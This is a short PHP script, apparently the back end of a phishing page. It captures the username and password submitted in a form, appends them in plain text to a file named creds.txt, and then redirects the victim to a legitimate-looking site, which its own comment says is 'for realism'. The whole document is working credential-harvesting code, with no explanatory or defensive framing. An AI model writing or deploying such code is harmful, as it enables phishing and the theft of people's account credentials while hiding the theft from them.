<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST['username'];
    $pass = $_POST['password'];

    $file = fopen("creds.txt", "a");
    fwrite($file, "Username: $user | Password: $pass\n");
    fclose($file);

    // Redirect user to a real page (for realism)
    header("Location: https://www.example.com");
    exit();
}
?>
